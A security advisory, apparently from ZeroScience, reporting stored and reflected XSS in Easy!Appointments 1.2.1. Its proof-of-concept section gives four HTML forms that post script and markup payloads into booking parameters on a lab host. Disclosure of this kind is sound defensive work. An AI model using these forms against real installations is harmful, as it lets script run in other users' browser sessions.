@@ -1,0 +1,112 @@
+Easy!Appointments v1.2.1 Multiple Stored XSS Vulnerabilities
+
+
+Vendor: Alex Tselegidis
+Product web page: http://www.easyappointments.org
+Affected version: 1.2.1
+
+Summary: Easy!Appointments is a highly customizable web application
+that allows your customers to book appointments with you via the web.
+Moreover, it provides the ability to sync your data with Google Calendar
+so you can use them with other services. It is an open source project
+and you can download and install it even for commercial use. Easy!Appointments
+will run smoothly with your existing website, because it can be installed
+in a single folder of the server and of course, both sites can share
+the same database. Learn more about the project in the Features page.
+
+Desc: The application suffers from multiple stored and reflected XSS
+vulnerabilities. The issues are triggered when an unauthorized input
+passed via multiple POST and GET parameters is not properly sanitized
+before being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+Tested on: Apache/2.4.23 (Win32)
+           OpenSSL/1.0.2h
+           MariaDB-10.1.19
+           PHP/5.6.28
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5442
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5442.php
+
+
+20.10.2017
+
+--
+
+
+PoC:
+
+{"name":"XSS1","description":"Description"}
+
+<html>
+  <body>
+    <form action="http://10.211.55.3/easyappointments121/index.php/backend_api/ajax_save_service_category" method="POST">
+      <input type="hidden" name="csrfToken" value="f5300ab64a4fae7bc3e56f2502905459" />
+      <input type="hidden" name="category" value="&#123;"name"&#58;"XSS1"&#44;"description"&#58;"Description"&#125;" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+---
+
+<html>
+  <body>
+    <form action="http://10.211.55.3/easyappointments121/index.php/appointments/ajax_get_available_hours" method="POST">
+      <input type="hidden" name="csrfToken" value="f5300ab64a4fae7bc3e56f2502905459" />
+      <input type="hidden" name="service&#95;id" value='"><script>alert(2)</script>' />
+      <input type="hidden" name="provider&#95;id" value="85" />
+      <input type="hidden" name="selected&#95;date" value="2017&#45;11&#45;30" />
+      <input type="hidden" name="service&#95;duration" value="30" />
+      <input type="hidden" name="manage&#95;mode" value="false" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+---
+
+<html>
+  <body>
+    <form action="http://10.211.55.3/easyappointments121/index.php/appointments/ajax_get_available_hours" method="POST">
+      <input type="hidden" name="csrfToken" value="f5300ab64a4fae7bc3e56f2502905459" />
+      <input type="hidden" name="service&#95;id" value="13" />
+      <input type="hidden" name="provider&#95;id" value="85" />
+      <input type="hidden" name="selected&#95;date" value="<marquee>" />
+      <input type="hidden" name="service&#95;duration" value="30" />
+      <input type="hidden" name="manage&#95;mode" value="false" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+---
+
+<html>
+  <body>
+    <form action="http://10.211.55.3/easyappointments121/index.php/appointments/ajax_register_appointment" method="POST">
+      <input type="hidden" name="csrfToken" value="f5300ab64a4fae7bc3e56f2502905459" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;last&#95;name&#93;" value="sdadsd" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;first&#95;name&#93;" value="asdasd" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;email&#93;" value="asdasd&#64;bbb&#46;dd" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;phone&#95;number&#93;" value="1112223333" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;address&#93;" value="" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;city&#93;" value="" />
+      <input type="hidden" name="post&#95;data&#91;customer&#93;&#91;zip&#95;code&#93;" value="" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;start&#95;datetime&#93;" value=""><script>alert&#40;3&#41;<&#47;script>" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;end&#95;datetime&#93;" value="2017&#45;11&#45;30&#32;16&#58;00&#58;00" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;notes&#93;" value="" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;is&#95;unavailable&#93;" value="false" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;id&#95;users&#95;provider&#93;" value="85" />
+      <input type="hidden" name="post&#95;data&#91;appointment&#93;&#91;id&#95;services&#93;" value="13" />
+      <input type="hidden" name="post&#95;data&#91;manage&#95;mode&#93;" value="false" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
